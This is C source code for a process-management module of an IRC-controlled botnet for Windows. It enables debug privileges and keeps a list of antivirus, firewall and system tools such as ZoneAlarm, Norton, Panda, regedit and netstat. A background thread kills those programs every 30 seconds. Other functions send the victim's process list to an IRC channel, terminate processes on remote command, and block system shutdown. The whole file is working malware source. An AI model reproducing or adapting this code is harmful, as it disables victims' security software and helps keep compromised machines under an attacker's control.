#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_PROCESS

// globals
#ifndef NO_AVFW_KILL
int killer_delay = 30000;

//FIX ME, ENCRYPT THESE!! Make this global
char *kill_list[]={
	"regedit.exe",
	"msconfig.exe",
	"netstat.exe",
	"msblast.exe",
	"zapro.exe",
	"navw32.exe",
	"navapw32.exe",
	"zonealarm.exe",
	"wincfg32.exe"
	"taskmon.exe",
	"PandaAVEngine.exe",
	"sysinfo.exe",
	"mscvb32.exe",
	"MSBLAST.exe",
	"teekids.exe",
	"Penis32.exe",
	"bbeagle.exe",
	"SysMonXP.exe", 
	"winupd.exe",
	"winsys.exe",
	"ssate.exe",
	"rate.exe",
	"d3dupdate.exe",
	"irun4.exe",
	"i11r54n4.exe"
};
#endif


bool AdjustPrivileges(char *pPriv, bool add)
{
	bool bRet = false;
	TOKEN_PRIVILEGES tkp;
 	HANDLE hToken;

	if (!fOpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
		return bRet;

	if (!fLookupPrivilegeValue(NULL, pPriv, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return bRet;
	}

	tkp.PrivilegeCount = 1; 
	if (add)
		tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;
	else 
		tkp.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tkp.Privileges[0].Attributes);

	bRet=fAdjustTokenPrivileges(hToken,false,&tkp,0,(PTOKEN_PRIVILEGES) NULL, 0);
	
	CloseHandle(hToken);

	return bRet;
}

int listProcesses(SOCKET sock, char *chan, bool notice, char *proccess, bool killthread, bool full)
{
	char sendbuf[IRCLINE];

	HANDLE hProcess, hProcess2;
	PROCESSENTRY32 pe32 = {0};
	MODULEENTRY32 me32 = {0};
	
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		AdjustPrivileges(SE_DEBUG_NAME, true);
		if ((hProcess = fCreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hProcess, &pe32)) {
				while (fProcess32Next(hProcess, &pe32)) {
					if (killthread) {
						#ifndef NO_AVFW_KILL
						for(int c = 0;c < (sizeof(kill_list) / sizeof(LPTSTR));c++) {
							if (lstrcmpi(pe32.szExeFile,kill_list[c]) == 0) {
 								if (hProcess2=OpenProcess(PROCESS_ALL_ACCESS,false,pe32.th32ProcessID))
									if (!TerminateProcess(hProcess2,0))
										CloseHandle(hProcess2);

								break;
							}
						}
						#endif
					}
					else if (!proccess) {
						if (chan) {
							hProcess2 = fCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
							me32.dwSize = sizeof(MODULEENTRY32);
							if (full) {
								if (fModule32First(hProcess2, &me32))
									sprintf(sendbuf," %s (%d)",me32.szExePath,pe32.th32ProcessID);
								else
									sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							} else
								sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							irc_privmsg(sock,chan,sendbuf,notice,true);
							CloseHandle(hProcess2);
						}
					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							hProcess2 = OpenProcess(PROCESS_ALL_ACCESS,false,pe32.th32ProcessID);
							CloseHandle(hProcess);

							if (!TerminateProcess(hProcess2,0)) {
								CloseHandle(hProcess2);

								return 0;
							}
							return 1;
						 }
					}
				} 
			}
			CloseHandle(hProcess);
		}
		AdjustPrivileges(SE_DEBUG_NAME, false);
	}

 	return 0;
}

DWORD WINAPI listProcessesThread(LPVOID param) 
{
	char sendbuf[IRCLINE];

	LPROC lproc = *((LPROC *)param);
	LPROC *lprocp = (LPROC *)param;
	lprocp->gotinfo = true;

	sprintf(sendbuf,"[PROC]: Listing processes:");
	if (!lproc.silent) irc_privmsg(lproc.sock,lproc.chan,sendbuf,lproc.notice);
	
	if (listProcesses(lproc.sock,lproc.chan,lproc.notice,NULL, false, lproc.full) == 0)
		sprintf(sendbuf,"[PROC]: Process list completed.");
	else 
		sprintf(sendbuf,"[PROC]: Process list failed.");

	if (!lproc.silent) irc_privmsg(lproc.sock, lproc.chan, sendbuf, lproc.notice);
	addlog(sendbuf);

	clearthread(lproc.threadnum);

	ExitThread(0);
}

int killProcess(int pid)
{
	int ret=1;

 	HANDLE pHandle;
	
	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS,false,pid)) != NULL)
		if(!TerminateProcess(pHandle,0)) {
			ret=0;
			CloseHandle(pHandle);
		}

	return ret;
}

#ifndef NO_AVFW_KILL
DWORD WINAPI kill_av(LPVOID param)
{
	while (1) {
		listProcesses(0,NULL,NULL,false,NULL,true);
		Sleep(killer_delay);
	}
	return 0;
}
#endif

bool KillProcess(const char *szProcName) {
	HANDLE hProcess; 
	DWORD aProcesses[1024], cbNeeded, cProcesses; 
	bool bRetVal=false;
	unsigned int i; 
	char szProcessName[MAX_PATH]; 
	HMODULE hMod;

	if (nopsapi) return bRetVal;
	if(!fEnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) return bRetVal;

	cProcesses=cbNeeded/sizeof(DWORD);
	for(i=0; i<cProcesses; i++) { 
		sprintf(szProcessName, "unknown");
		hProcess=OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, false, aProcesses[i]);
		if(hProcess) { 
			if(fEnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) { 
				fGetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				if(!stricmp(szProcessName, szProcName)) { 
					TerminateProcess(hProcess, 0);
					bRetVal=true; 
				}
			}
		CloseHandle(hProcess);
		} 
	}
	return bRetVal;
}

DWORD WINAPI AbortCrash(LPVOID param)
{
	while (1) {
		// Get the LUID for shutdown privilege. 

		if(!AdjustPrivileges(SE_SHUTDOWN_NAME, true))
			break;

		// Prevent the system from shutting down. 

		if(!fAbortSystemShutdown(NULL)) 
			break; 

		// Disable shutdown privilege. 

		if(!AdjustPrivileges(SE_SHUTDOWN_NAME, false))
			break;

		Sleep(3000);
	}
	ExitThread(EXIT_SUCCESS);
}
#endif